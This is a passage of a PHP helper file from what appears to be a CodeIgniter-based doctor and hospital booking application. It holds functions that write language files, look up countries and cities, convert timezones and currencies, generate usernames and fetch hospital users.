          foreach ($language_management_english as $lrows) {
            $language_key_value = '$lang["' . $lrows['lang_key'] . '"]="' . str_replace('"', '', $lrows['lang_value']) . '";';
            $txt .= "\r\n" . $language_key_value;
          }
        }
        $txt .= "\r\n" . 'return ["language"=>$lang];';
        fwrite($myfile, $txt);
        // $rewritedata = file_get_contents($path.'content_lang.php');
        // $rewritedata = str_replace('lang', '$lang', $rewritedata);
        // write_file($path.'content_lang.php', $rewritedata);
        fclose($myfile);
      }
    }
  }
}

// Newly added code on 14-10-2022 Start//
if (!function_exists('get_country')) {
  function get_country()
  {
    $db = \Config\Database::connect();
    $builder = $db->table('country');
    $country = $builder->select('country')->get()->getResultArray();
    return $country;
  }
}

if (!function_exists('convertToTz')) {
  function convertToTz($time = "", $toTz = '', $fromTz = '')
  {
    $date = new DateTime($time, new DateTimeZone($fromTz));
    $date->setTimezone(new DateTimeZone($toTz));
    $time = $date->format('Y-m-d H:i:s');
    return $time;
  }
}

if (!function_exists('get_countryid')) {
  function get_countryid($country)
  {
    $db = \Config\Database::connect();
    $builder = $db->table('country');
    $country = $builder->select('countryid')->getWhere(array('country' => $country))->getResultArray();
    $countryid = '';
    foreach ($country as $val) {
      $countryid = $val['countryid'];
    }
    return $countryid;
  }
}
if (!function_exists('get_city_of_country')) {
  function get_city_of_country($countryid)
  {
    $db = \Config\Database::connect();
    $builder = $db->table('city c');

    $builder->select('c.city');
    $builder->join('state s', 's.id = c.stateid', 'inner');
    $builder->where('s.countryid', $countryid);
    $query = $builder->get();
    return $query->getResultArray();
  }
}
// Newly added code on 14-10-2022 End //

// user currency convert
function convert_to_user_currency($total_amount, $currency_code = '')
{
  if (empty($total_amount)) {
    return NULL;
  }

  // user currency
  $user_currency = get_user_currency();
  $user_currency_code = $user_currency['user_currency_code'];

  if (!empty($currency_code)) {
    $currency_option = (!empty($user_currency_code)) ? $user_currency_code : $currency_code;
  } else {
    $currency_option = (!empty($user_currency_code)) ? $user_currency_code : default_currency_code();
  }

  $rate_symbol = currency_code_sign($currency_option);

  $amount = get_doccure_currency($total_amount, $currency_code, $user_currency_code);

  $amount = number_format($amount, 2);

  return $rate_symbol . $amount;
}

if (!function_exists('str_slug')) {
  function str_slug($string_name, $separator = 'dash', $lowercase = TRUE)
  {
    $rand_no = 200;

    $username_parts = array_filter(explode(" ", mb_strtolower($string_name, 'UTF-8'))); //explode and lowercase name
    $username_parts = array_slice($username_parts, 0, 2); //return only first two arry part

    $part1 = (!empty($username_parts[0])) ? mb_substr($username_parts[0], 0, 8, 'utf-8') : ""; //cut first name to 8 letters
    $part2 = (!empty($username_parts[1])) ? mb_substr($username_parts[1], 0, 5, 'utf-8') : ""; //cut second name to 5 letters
    $part3 = ($rand_no) ? rand(0, $rand_no) : "";
    $username = $part1 . $part2 . $part3; //str_shuffle to randomly shuffle all characters
    return $username;
  }
}

if (!function_exists('user_hospital')) {
  function user_hospital($hospital_id)
  {
    $db = \Config\Database::connect();
    $builder = $db->table('users');
    $builder->select('u.id as userid,u.first_name,u.last_name,u.username');
    $builder->from('users u');
    $builder->where('u.id', $hospital_id);
    return $result = $builder->get()->getRowArray();
  }
}

if (!function_exists('getCurrentDayName')) {
  function getCurrentDayName() {
    return date('l');
  }
}
